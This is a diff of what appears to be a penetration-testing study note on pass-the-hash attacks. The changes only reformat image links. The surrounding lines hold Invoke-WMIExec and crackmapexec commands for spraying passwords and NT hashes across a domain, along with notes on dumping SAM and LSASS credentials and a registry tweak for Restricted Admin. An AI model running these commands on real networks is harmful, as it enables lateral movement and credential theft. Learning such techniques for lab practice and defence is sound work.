@@ -28,7 +28,7 @@ VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
 Import-Module ./Invoke-TheHash.psd1
 Invoke-WMIExec -Target <machine (DC01)> -Domain <DOMAIN> -Username <user> -Hash <NT_hash> -Command "powershell -e <base64 payload>" 
 ```
-![[/image 244.png|image 244.png]]
+![image 244.png](/image%20244.png)
   
   
 # Impacket (Linux)
@@ -96,7 +96,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
   
 crackmapexe smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
 - passes the login info to every machine capable on the domain
-![[/Untitled 21.png|Untitled 21.png]]
+![Untitled 21.png](/Untitled%2021.png)
 - can also do it with hashes
     
     - use -H instead
@@ -119,20 +119,20 @@ crackmapexe smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
     
     - can steal creds from the lsass because it stores credentials
     
-![[/Untitled 1 8.png|Untitled 1 8.png]]
+![Untitled 1 8.png](/Untitled%201%208.png)
 cmedb - database showing all crackmapexec info
   
 crackmapexec with user hash
 - “crackmapexec smb 192.168.83.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth”
   
 pass the hash dumping the sam
-![[/Untitled 2 8.png|Untitled 2 8.png]]
+![Untitled 2 8.png](/Untitled%202%208.png)
   
 pass the hash dumping the shares we can access
-![[/Untitled 3 6.png|Untitled 3 6.png]]
+![Untitled 3 6.png](/Untitled%203%206.png)
   
 list of all crackmapexec modules
-![[/Untitled 4 4.png|Untitled 4 4.png]]
+![Untitled 4 4.png](/Untitled%204%204.png)
   
 cmedb in action
-![[/Untitled 5 4.png|Untitled 5 4.png]]
+![Untitled 5 4.png](/Untitled%205%204.png)
